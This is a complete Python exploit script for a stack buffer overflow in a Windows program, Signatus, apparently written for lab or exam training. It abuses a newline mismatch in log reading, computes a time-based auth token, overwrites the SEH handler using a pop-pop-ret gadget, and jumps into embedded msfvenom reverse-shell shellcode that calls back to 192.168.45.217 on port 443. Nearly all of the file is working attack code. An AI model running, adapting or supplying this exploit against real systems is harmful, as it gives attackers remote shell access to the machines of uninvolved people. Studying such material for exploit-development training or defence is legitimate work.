#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys
import time

# based on https://github.com/bmdyy/signatus/blob/main/Exploit/poc.py
# Attach windbg to Signatus.exe
# 0:003> !nmod
# 60ae0000 60ae6000 Signatus             /SafeSEH OFF /GS            C:\Signatus.exe

# Vulnerability in program: reading from log with fscanf expects newline
# but writing to log doesn't automatically append it.
# => Attacker can send two write calls (without a newline), and then a read call,
# which will read the large input into a fixed-size buffer on the stack, thereby
# overflowing it. GS will then trigger the SEH, which we can override because
# Signatus is compiled without SafeSEH.

def main() :
    server = sys.argv[1]
    clearlog(server)
    writelog(server)
    readlog(server)

def clearlog(server):
    """Clear the log to start from a clean/fresh state"""
    sendPayload(server, opcode=0x3)

def writelog(server):
    """Write actual payload to the log file"""
    writeChunkSize = 2000                               # some size that can be fully written in one request
    badchars       = b"\x00\x0a"                        # because of fscanf string format

    payload  = b""
    # payload += b"w00tw00t"
    payload += nopsled()
    # payload += b"\xcc"                                # int3 / debug
    payload += shellcode()
    payload += b"A" * (writeChunkSize - len(payload))
    for b in badchars: assert b not in payload
    assert len(payload) == writeChunkSize

    sendPayload(server, opcode=0x1, payload=payload)

    # payload  = pwn.cyclic(writeChunkSize - len(payload) - 1)
    offSeh = 0x32b                                      # pwn.cyclic_find(0x61616469)

    payload  = b""
    payload += b"B" * (offSeh - len(payload) - 4)
    payload += b"\xeb\x0e\x90\x90"                      # NSEH: pwn.asm("jmp .+0x10 ; nop ; nop")
    payload += pack("<I", 0x60ae2181)                   # SEH: pop esi ; pop ebp ; ret
    payload += nopsled(length=0x20)
    # payload += b"\xcc"                                # int3 / debug
    offEipShellcode  = -0x898
    payload += b"\xe9\x68\xf7\xff\xff"                  # pwn.asm(f"jmp .+({offEipShellcode})")
    payload += b"Z" * (writeChunkSize - len(payload) - 1)
    for b in badchars: assert b not in payload
    payload += b"\n"
    assert len(payload) == writeChunkSize, f"Mismatching size: {len(payload)} != {writeChunkSize}"
    sendPayload(server, opcode=0x1, payload=payload)

def readlog(server):
    """Trigger SEH override and divert exection flow into the previously loaded payload"""
    sendPayload(server, opcode=0x2)


def nopsled(length=0x10):
    return b"\x90" * length

def shellcode():
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.217 LPORT=443 -f python -b "\x00\x0a\x1a" -e x86/call4_dword_xor
    # nc -vlnp 443
    buf =  b""
    buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
    buf += b"\x81\x76\x0e\x22\x99\xb8\xad\x83\xee\xfc\xe2\xf4"
    buf += b"\xde\x71\x3a\xad\x22\x99\xd8\x24\xc7\xa8\x78\xc9"
    buf += b"\xa9\xc9\x88\x26\x70\x95\x33\xff\x36\x12\xca\x85"
    buf += b"\x2d\x2e\xf2\x8b\x13\x66\x14\x91\x43\xe5\xba\x81"
    buf += b"\x02\x58\x77\xa0\x23\x5e\x5a\x5f\x70\xce\x33\xff"
    buf += b"\x32\x12\xf2\x91\xa9\xd5\xa9\xd5\xc1\xd1\xb9\x7c"
    buf += b"\x73\x12\xe1\x8d\x23\x4a\x33\xe4\x3a\x7a\x82\xe4"
    buf += b"\xa9\xad\x33\xac\xf4\xa8\x47\x01\xe3\x56\xb5\xac"
    buf += b"\xe5\xa1\x58\xd8\xd4\x9a\xc5\x55\x19\xe4\x9c\xd8"
    buf += b"\xc6\xc1\x33\xf5\x06\x98\x6b\xcb\xa9\x95\xf3\x26"
    buf += b"\x7a\x85\xb9\x7e\xa9\x9d\x33\xac\xf2\x10\xfc\x89"
    buf += b"\x06\xc2\xe3\xcc\x7b\xc3\xe9\x52\xc2\xc6\xe7\xf7"
    buf += b"\xa9\x8b\x53\x20\x7f\xf1\x8b\x9f\x22\x99\xd0\xda"
    buf += b"\x51\xab\xe7\xf9\x4a\xd5\xcf\x8b\x25\x66\x6d\x15"
    buf += b"\xb2\x98\xb8\xad\x0b\x5d\xec\xfd\x4a\xb0\x38\xc6"
    buf += b"\x22\x66\x6d\xfd\x72\xc9\xe8\xed\x72\xd9\xe8\xc5"
    buf += b"\xc8\x96\x67\x4d\xdd\x4c\x2f\xc7\x27\xf1\x78\x05"
    buf += b"\x0f\x40\xd0\xaf\x22\x98\x03\x24\xc4\xf3\xa8\xfb"
    buf += b"\x75\xf1\x21\x08\x56\xf8\x47\x78\xa7\x59\xcc\xa1"
    buf += b"\xdd\xd7\xb0\xd8\xce\xf1\x48\x18\x80\xcf\x47\x78"
    buf += b"\x4a\xfa\xd5\xc9\x22\x10\x5b\xfa\x75\xce\x89\x5b"
    buf += b"\x48\x8b\xe1\xfb\xc0\x64\xde\x6a\x66\xbd\x84\xac"
    buf += b"\x23\x14\xfc\x89\x32\x5f\xb8\xe9\x76\xc9\xee\xfb"
    buf += b"\x74\xdf\xee\xe3\x74\xcf\xeb\xfb\x4a\xe0\x74\x92"
    buf += b"\xa4\x66\x6d\x24\xc2\xd7\xee\xeb\xdd\xa9\xd0\xa5"
    buf += b"\xa5\x84\xd8\x52\xf7\x22\x48\x18\x80\xcf\xd0\x0b"
    buf += b"\xb7\x24\x25\x52\xf7\xa5\xbe\xd1\x28\x19\x43\x4d"
    buf += b"\x57\x9c\x03\xea\x31\xeb\xd7\xc7\x22\xca\x47\x78"

    return buf


def sendPayload(server, opcode, payload=b""):
    buf  = b""
    buf += pack("<I", getOTD())
    buf += pack("<I", opcode)
    buf += payload

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 9999))
    s.send(buf)
    s.close()

def getOTD():
    # 60AE13E3 cmp     edi, edx
    SECRET     = 0x74829726
    TIMEOFFSET = 0          # offset in seconds between machine where exploit is executed (linux)
                            # and the target machine (windows)
                            # ([DateTimeOffset]::Now.ToUnixTimeSeconds()) - (date +%s)
    seconds = int(time.time()) + TIMEOFFSET
    s       = (seconds // 10) & 0xff
    sec_d   =  (s**1)
    sec_d  |= ((s**2) >> (4*1)) << (8*1)
    sec_d  |= ((s**3) >> (4*2)) << (8*2)
    sec_d  |= ((s**4) >> (4*3)) << (8*3)
    return (sec_d ^ SECRET) & 0xffffffff

if __name__ == "__main__":
    main()
